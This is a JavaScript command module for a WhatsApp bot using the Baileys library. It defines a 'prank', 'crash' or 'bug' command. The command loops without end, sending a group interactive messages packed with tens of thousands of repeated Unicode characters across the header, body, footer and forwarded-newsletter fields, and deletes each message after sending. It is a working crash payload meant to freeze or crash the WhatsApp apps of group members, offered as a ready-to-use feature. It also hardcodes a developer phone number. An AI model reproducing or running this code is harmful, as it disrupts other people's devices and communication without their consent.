import { delay } from 'baileys'
const DEVELOPER_NUMBER = "34672982032@s.whatsapp.net"

export default {
  command: 'prank',
  alias: ['crash', 'bug'],
  category: 'owner',
  description: 'Fitur crash payload khusus grup.',
  groupOnly: true,
  ownerOnly: true,

  async execute(m, { sock }) {
    const target = m.chat

    await sock.message.send(target, { react: { text: '💣', key: m.key } })
    await m.reply('⏳ Memproses...')

    try {
      
      ;(async () => {
        while (true) {
          const X1 = "ោ៝".repeat(5500)
          const X2 = "᭯".repeat(5500)
          const X3 = "ꦾ".repeat(5500)
          const Titid = X1 + X2 + X3


          let sentId = await sock.message.send(
            target,
            {
              interactiveMessage: {
                header: {
                  title: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดสดเอ็กซ์เอ็กซ์".repeat(1000) + Titid,
                  subtitle: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดสดเอ็กซ์เอ็กซ์".repeat(1000) + X1,
                  hasMediaAttachment: true,
                  jpegThumbnail: null,
                },
                body: {
                  text: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดสดเอ็กซ์เอ็กซ์".repeat(1000) + X2
                },
                footer: {
                  text: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดสดเอ็กซ์เอ็กซ์".repeat(1000) + X3
                },
                contextInfo: {
                  mentionedJid: " ",
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterName: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดสดเอ็กซ์เอ็กซ์".repeat(1000),
                    newsletterJid: "120363344594934051@newsletter",
                    serverMessageId: 143,
                  },
                  businessMessageForwardInfo: {
                    businessOwnerJid: sock.getCredentials?.()?.meJid || '',
                  },
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: 'catalog_message',
                      buttonParamsJson: JSON.stringify({}),
                    },
                  ],
                  messageParamsJson: '{}',
                },
              },
            },
            {
              additionalAttributes: {
    type: "text"
  }
            }
          ).catch(() => {})

          if (sentId) {
            await sock.message.send(target, {
              delete: { remoteJid: target, id: sentId, fromMe: true }
            }).catch(() => {})
          }

          await delay(1500)
        }
      })()

      await sock.message.send(target, { react: { text: '✅', key: m.key } })

    } catch (e) {
      console.error(e)
      m.reply(`❌ Error: ${e.message}`)
    }
  }
}